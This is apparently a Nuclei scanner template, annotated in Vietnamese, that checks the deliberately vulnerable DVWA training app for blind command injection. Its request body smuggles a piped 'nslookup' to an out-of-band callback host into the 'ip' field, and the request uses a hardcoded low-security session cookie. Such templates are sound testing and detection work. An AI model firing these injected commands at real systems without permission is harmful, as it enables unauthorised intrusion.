id: cmdi-dvwa-exec

info:
  name: DVWA Command Injection via exec
  author: van
  severity: high
  description: |
    Kiểm tra lỗ hổng Command Injection trong trang exec của DVWA bằng kỹ thuật out-of-band (OAST).
  tags: dvwa,cmdi,exec,oast,rce,blind

variables:
  marker: "{{interactsh-url}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/DVWA/vulnerabilities/exec/"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: "PHPSESSID=12g9sj6gdknke4870ld4boosib; security=low"
      User-Agent: "Mozilla/5.0"

    body: "ip=127.0.0.1|nslookup {{marker}}&Submit=Submit"

    stop-at-first-match: true

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
